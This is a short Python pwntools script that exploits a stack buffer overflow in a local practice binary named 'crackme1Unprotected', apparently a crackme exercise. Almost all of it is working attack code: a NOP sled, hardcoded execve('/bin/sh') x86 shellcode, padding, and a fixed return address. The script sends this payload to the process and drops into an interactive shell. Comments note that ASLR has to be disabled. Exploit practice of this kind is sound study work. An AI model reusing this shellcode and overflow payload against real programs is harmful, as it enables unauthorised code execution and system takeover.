from pwn import context, ELF, process, p32, pause
import os

context.update(arch='i386', os='linux')

filename = "./crackme1Unprotected"
# elf = ELF(filename)
p = process(filename, env=None)
pause()

# shellcode = asm(shellcraft.sh())
# Linux x86 execve("/bin/sh") - 28 bytes
# (http://shell-storm.org/shellcode/files/shellcode-811.php)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# shellcode = b"\xCC" * 4
padding = b"\x90" * (128 - len(shellcode))
# print(len(shellcode))
ebp = b"B" * 16

ret_address = p32(0xffffce2c, endian="little")
# 0xff9f32dc, 0xffd7b7dc -> new address! We need to disable ASLR also!
ret_address_env_i = p32(0xffffdd08, endian="little")
payload = padding + shellcode + ebp + ret_address_env_i
# sys.stdout.buffer.write(payload)
with open("payload.txt", "wb") as file_payload:
    file_payload.write(payload)
os.system("cat payload.txt | hexdump -C")
p.sendline(payload)
p.interactive()

# start of buffer: 0xfff3228c
# start of buffer: 0xff9eff5c
# !!!
